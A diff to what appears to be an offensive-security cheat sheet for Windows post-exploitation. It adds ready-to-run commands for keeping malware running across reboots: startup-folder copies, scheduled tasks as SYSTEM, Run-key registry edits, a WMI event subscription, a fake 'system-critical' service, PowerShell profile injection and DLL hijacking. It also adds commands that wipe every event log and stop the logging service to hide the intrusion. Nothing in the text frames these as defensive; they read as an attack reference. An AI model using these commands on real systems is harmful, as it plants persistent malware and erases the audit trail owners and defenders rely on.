@@ -72,9 +72,73 @@ Invoke-Command -ComputerName target_machine_ip -ScriptBlock { Get-Process }
 #extracting ssh/rdp creds
 reg query HKLM\SOFTWARE\Microsoft\Terminal Server Client\Default\Servers
 
+####################
+PERSISTENCE
+###################
+#Start up folder
+copy C:\path\to\malware.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" (current user)
+copy C:\path\to\malware.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" (all users)
+
+#Scheduled Tasks
+schtasks /create /sc daily /tn "Updater" /tr "C:\path\to\malware.exe" /st 09:00
+schtasks /create /sc minute /mo 1 /tn "CriticalUpdate" /tr "C:\path\to\malware.exe" /ru SYSTEM (requites admin priv)
+
+#Reg Mod
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d "C:\path\to\malware.exe" /f
+(other reg keys,
+RunOnce: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+Services: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+Userinit: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+)
+
+#WMI premanent event subscription (powershell)
+$Filter = Set-WmiInstance -Namespace "root\subscription" `
+    -Class __EventFilter -Arguments @{Name=’PersistentEvent’; EventNamespace=’root\cimv2’; QueryLanguage="WQL"; `
+    Query="SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"}
+
+$Consumer = Set-WmiInstance -Namespace "root\subscription" `
+    -Class CommandLineEventConsumer -Arguments @{Name=’Payload’; CommandLineTemplate="C:\path\to\malware.exe"}
+
+Set-WmiInstance -Namespace "root\subscription" `
+    -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer}
+
+#Services (creat or modify)
+sc create MalwareService binPath= "C:\path\to\malware.exe" start= auto
+sc description MalwareService "This is a system-critical service"
+net start MalwareService
+
+#Powershell profile
+echo "Start-Process 'C:\path\to\malicious.ps1'" >> $PROFILE
+
+#DLL Hijacking
+Replace a legitimate DLL like version.dll with a malicious one in the same directory as the app that requires it.
+
+
+
+
+
 ###############
-STEALTH
+STEALTH(admin priv required)
 ###############
-#clear logs
-Clear-EventLog -LogName "Security"
+#check availible logs(wevtutil)
+wevtutil el
+
+#clear logs(wevtutil)
+for /f %i in ('wevtutil el') do wevtutil cl %i
+wevtutil cl Security
+wevtutil cl Application
+wevtutil cl System
+
+#check availible logs(powershell)
+Get-EventLog -List
+
+#clear logs(powershell)
+Get-EventLog -List | ForEach-Object {Clear-EventLog -LogName $_.Log}
+Clear-EventLog -LogName Security
+
+#Disable logging / restart logging
+net stop eventlog
+net start eventlog
+
+
 
